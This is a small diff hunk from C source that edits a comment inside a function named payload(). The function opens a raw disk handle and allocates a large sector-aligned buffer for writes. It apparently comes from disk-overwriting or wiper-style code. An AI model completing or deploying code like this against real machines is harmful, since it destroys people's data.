@@ -252,7 +252,7 @@ void payload() {
             &bytesReturned,
             NULL
         );
-        // large buffer for faster writes, not as fast as powershell :(
+        // large buffer for faster writes, virtualalloc to get mem from the os instead of the stack :)
         const size_t bufSize = 16 * 1024 * 1024; // has to be divisble by 512
         char* buffer = (char*)VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!buffer) { CloseHandle(hDisk); return; }
